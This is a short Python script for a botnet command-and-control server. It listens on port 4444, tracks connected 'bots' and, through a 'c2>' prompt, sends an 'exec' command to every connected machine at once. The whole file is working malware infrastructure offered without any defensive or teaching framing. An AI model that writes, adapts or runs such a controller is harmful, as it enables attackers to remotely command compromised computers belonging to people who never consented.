import socket
import threading
import os

HOST = "0.0.0.0"
PORT = 4444

clients = []

def handle_client(conn, addr):
    print(f"[+] New bot: {addr}")
    clients.append(conn)
    while True:
        try:
            data = conn.recv(1024)
            if not data:
                break
        except:
            break
    clients.remove(conn)
    conn.close()
    print(f"[-] Bot offline: {addr}")

def command_loop():
    while True:
        cmd = input("c2> ")
        if cmd == "list":
            print(f"Bots online: {len(clients)}")
        elif cmd.startswith("exec"):
            for c in clients:
                c.send(cmd[5:].encode())
        elif cmd == "exit":
            for c in clients:
                c.send(b"exit")
            os._exit(0)

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((HOST, PORT))
server.listen(5)

print(f"C2 listening on {HOST}:{PORT}")

threading.Thread(target=command_loop, daemon=True).start()

while True:
    conn, addr = server.accept()
    threading.Thread(target=handle_client, args=(conn, addr), daemon=True).start()
